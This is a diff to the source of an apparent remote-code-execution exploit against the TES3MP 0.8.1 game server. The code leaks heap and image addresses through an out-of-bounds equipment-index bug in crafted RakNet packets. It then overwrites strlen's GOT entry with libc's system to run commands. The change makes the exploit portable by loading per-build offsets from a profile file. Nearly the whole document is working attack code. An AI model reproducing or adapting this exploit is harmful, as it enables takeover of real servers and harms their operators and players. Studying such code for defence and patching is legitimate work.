@@ -32,14 +32,60 @@
 using namespace RakNet;
 
 // ---- target profile (measured on the distributed 0.8.1 linux build + Ubuntu 24.04 glibc 2.39) ----
+// Everything that is true of a BUILD rather than of a run. Two halves with different origins:
+// the image RVAs come from the target's ELF (public release artifact, or --server-bin), and the
+// layout constants come from its C++ class layout, which no ELF records. tools/gen-profile derives
+// the second half from the headers; --profile loads either half from a file.
 struct Profile {
     uint64_t vtable_rva;   // "vtable for Player + 16", i.e. the value stored at Player+0
     uint64_t strlen_got;   // .got.plt slot for strlen  (the hijack target)
     uint64_t malloc_got;   // .got.plt slot for malloc  (non-IFUNC: safe for deriving the libc base)
     uint64_t malloc_off;   // malloc offset within libc  (only used with --malloc-off/--libc)
     uint64_t system_off;   // system offset within libc  (only used with --system-off/--libc)
+    // --- class layout. Not derivable from the ELF; see tools/gen-profile.cc. ---
+    uint64_t equip_off;      // offsetof(BasePlayer, equipmentItems)
+    uint64_t item_stride;    // sizeof(mwmp::Item)
+    uint64_t item_count_off; // offsetof(Item, count), where the OOB read/write lands
+    uint64_t leak_heap_idx;  // index whose count|charge overlaps chatMessage._M_p
+    uint64_t leak_self_idx;  // index whose count|charge overlaps creatureRefId._M_p (a self-pointer)
+    uint64_t self_ptr_delta; // offsetof(BasePlayer, creatureRefId) + 16 (its SSO buffer)
 };
-static Profile P = { 0x2b5f90, 0x2c31f8, 0x2c3660, 0xad750, 0x58750 };
+static Profile P = { 0x2b5f90, 0x2c31f8, 0x2c3660, 0xad750, 0x58750,
+                     0xe00, 80, 32, 25, 28, 0x16f0 };
+
+// A profile is `key = value` lines, # comments, blanks ignored. Unknown keys are reported rather
+// than skipped: a typo in a hand-edited profile that silently keeps a baked-in default is the
+// same class of failure as the constants it replaces.
+static bool loadProfile(const char *path)
+{
+    FILE *f = fopen(path, "r");
+    if (!f) { perror(path); return false; }
+    struct { const char *k; uint64_t *v; } tab[] = {
+        {"vtable_rva", &P.vtable_rva}, {"strlen_got", &P.strlen_got}, {"malloc_got", &P.malloc_got},
+        {"malloc_off", &P.malloc_off}, {"system_off", &P.system_off},
+        {"equip_off", &P.equip_off}, {"item_stride", &P.item_stride},
+        {"item_count_off", &P.item_count_off}, {"leak_heap_idx", &P.leak_heap_idx},
+        {"leak_self_idx", &P.leak_self_idx}, {"self_ptr_delta", &P.self_ptr_delta},
+    };
+    char line[512]; int n = 0; bool ok = true;
+    while (fgets(line, sizeof line, f)) {
+        char *h = strchr(line, '#'); if (h) *h = 0;
+        char *eq = strchr(line, '='); if (!eq) continue;
+        *eq = 0;
+        char key[128] = {0}; if (sscanf(line, " %127s", key) != 1) continue;
+        // Informational keys gen-profile emits that are not addresses.
+        if (!strcmp(key, "name") || !strcmp(key, "token") || !strcmp(key, "scratch_field") ||
+            !strcmp(key, "groom_off") || !strcmp(key, "libc")) continue;
+        bool hit = false;
+        for (auto &t : tab)
+            if (!strcmp(key, t.k)) { *t.v = strtoull(eq + 1, 0, 0); n++; hit = true; break; }
+        if (!hit) { fprintf(stderr, "%s: unknown key '%s'\n", path, key); ok = false; }
+    }
+    fclose(f);
+    if (!ok) { fprintf(stderr, "%s: refusing to run on a profile I do not fully understand.\n", path); return false; }
+    printf("[*] profile %s: %d values loaded\n", path, n);
+    return true;
+}
 
 // Read malloc/system offsets straight out of a copy of the TARGET's libc.so.6. glibc patch builds shift
 // symbol offsets, so the baked-in defaults only match the exact build they were measured on. Minimal ELF64
@@ -469,7 +515,7 @@ static int runShell(const char *name, const char *acctPass, const char *oneShot)
 static void redirect(Cli &c, uint64_t val)
 {
     BitStream bs; hdr(c, bs, ID_PLAYER_EQUIPMENT);
-    bs.Write(false); uint32_t cnt = 1; bs.Write(cnt); int idx = 25; bs.Write(idx);
+    bs.Write(false); uint32_t cnt = 1; bs.Write(cnt); int idx = (int)P.leak_heap_idx; bs.Write(idx);
     RakString rid(""); RakString::SerializeCompressed(rid.C_String(), &bs);
     int lo = (int)(val & 0xffffffff), hi = (int)(val >> 32), e = 0;
     bs.Write(lo); bs.Write(hi); bs.Write(e); snd(c, bs); usleep(120000);
@@ -567,7 +613,7 @@ static ReadResult harvestFull(Cli &R, int k)
 // would silently truncate a single 6-byte write.
 static ReadResult aread(Cli &A, Cli &R, uint64_t eq, int k, uint64_t tgt, const char *cell)
 {
-    uint64_t eqk = eq + 80 * k;
+    uint64_t eqk = eq + P.item_stride * k;
     for (int i = 0; i < 6; i++) {
         unsigned char b = (unsigned char)((tgt >> (8 * i)) & 0xff);
         redirect(A, eqk + i);
@@ -652,6 +698,9 @@ static void usage(const char *a0)
       "                              CoreScripts gates chat on IsLoggedIn(); it registers on first use\n"
       "                              and so leaves data/player/<name>.json on the target.\n"
       "  -A, --account-pass <pw>     account password for -s (default: rce-poc-pw-1)\n"
+      "  -F, --profile <file>        load a target profile (layout + RVAs). tools/gen-profile derives\n"
+      "                              the layout half from a TES3MP tree; -B derives the RVA half from\n"
+      "                              the target binary and overrides what the profile supplied.\n"
       "  -B, --server-bin <path>     read the vtable/strlen@got/malloc@got RVAs from a copy of the TARGET's\n"
       "                              tes3mp-server.x86_64. Needed only if the target is not the stock 0.8.1.\n"
       "  -L, --libc <path>           read malloc/system offsets from a copy of the TARGET's libc.so.6.\n"
@@ -691,11 +740,12 @@ int main(int argc, char **argv)
         {"probe", no_argument, 0, 'p'},
         {"libc", required_argument, 0, 'L'}, {"server-bin", required_argument, 0, 'B'},
         {"malloc-off", required_argument, 0, 'M'}, {"system-off", required_argument, 0, 'S'},
+        {"profile", required_argument, 0, 'F'},
         {"verbose", no_argument, 0, 'v'}, {"help", no_argument, 0, 'h'}, {0, 0, 0, 0}};
-    const char *libcPath = 0, *serverBin = 0;
+    const char *libcPath = 0, *serverBin = 0, *profPath = 0;
     int mGiven = 0, sGiven = 0;
     int c;
-    while ((c = getopt_long(argc, argv, "P:c:t:b:n:C:psA:L:B:M:S:vh", lo, 0)) != -1) {
+    while ((c = getopt_long(argc, argv, "P:c:t:b:n:C:psA:L:B:M:S:F:vh", lo, 0)) != -1) {
         switch (c) {
             case 'P': g_srvpass = optarg; break;
             case 'c': cmd = optarg; break;
@@ -708,6 +758,7 @@ int main(int argc, char **argv)
             case 'A': acctPass = optarg; break;
             case 'L': libcPath = optarg; break;
             case 'B': serverBin = optarg; break;
+            case 'F': profPath = optarg; break;
             case 'M': P.malloc_off = strtoull(optarg, 0, 0); mGiven = 1; break;
             case 'S': P.system_off = strtoull(optarg, 0, 0); sGiven = 1; break;
             case 'v': g_verbose = 1; break;
@@ -727,6 +778,7 @@ int main(int argc, char **argv)
         return runShell(nameBase, acctPass, cmdGiven ? cmd : 0);
     }
 
+    if (profPath && !loadProfile(profPath)) return 2;
     if (serverBin) {
         if (!readServerBin(serverBin, P.vtable_rva, P.strlen_got, P.malloc_got)) {
             printf("[!] could not read RVAs from %s\n", serverBin); return 2;
@@ -783,7 +835,7 @@ int main(int argc, char **argv)
 
     // 1. a live heap pointer (chatMessage's buffer). Not the base: only a valid writable address.
     for (Packet *p = R.peer->Receive(); p; R.peer->DeallocatePacket(p), p = R.peer->Receive());
-    truncEq(A, 25); int oi; uint64_t heap = harvest(R, oi);
+    truncEq(A, (int)P.leak_heap_idx); int oi; uint64_t heap = harvest(R, oi);
     if (heap < 0x100000000ULL) { printf("[!] heap leak failed\n"); return 3; }
     printf("[+] heap scratch pointer  %#llx\n", (unsigned long long)heap);
 
@@ -794,11 +846,11 @@ int main(int argc, char **argv)
 
     // 3. the real object base, from creatureRefId's self-pointer
     for (Packet *p = R.peer->Receive(); p; R.peer->DeallocatePacket(p), p = R.peer->Receive());
-    truncEq(A, 28); uint64_t l28 = harvest(R, oi);
+    truncEq(A, (int)P.leak_self_idx); uint64_t l28 = harvest(R, oi);
     { BitStream bs; hdr(A, bs, ID_PLAYER_ANIM_PLAY); RakString gn(""); bs.Write(gn);
       int z = 0; bs.Write(z); bs.Write(z); bool ps = false; bs.Write(ps); snd(A, bs); } usleep(150000);
     if (l28 < 0x100000000ULL) { printf("[!] base leak failed\n"); return 3; }
-    uint64_t base = l28 - 0x16f0, eq = base + 0xe00;
+    uint64_t base = l28 - P.self_ptr_delta, eq = base + P.equip_off;
     printf("[+] BasePlayer base      %#llx\n", (unsigned long long)base);
 
     // 4. image base, from the Player vtable pointer at base-8
@@ -839,7 +891,7 @@ int main(int argc, char **argv)
 
     // 6. aim eq[7].refId at strlen@got. capacity must exceed the value we are about to assign,
     //    or _M_replace takes the reallocating path and free()s the GOT address itself.
-    uint64_t eqk = eq + 80 * 7;
+    uint64_t eqk = eq + P.item_stride * 7;
     for (int i = 0; i < 6; i++) {
         unsigned char b = (unsigned char)((sgot >> (8 * i)) & 0xff);
         redirect(A, eqk + i);
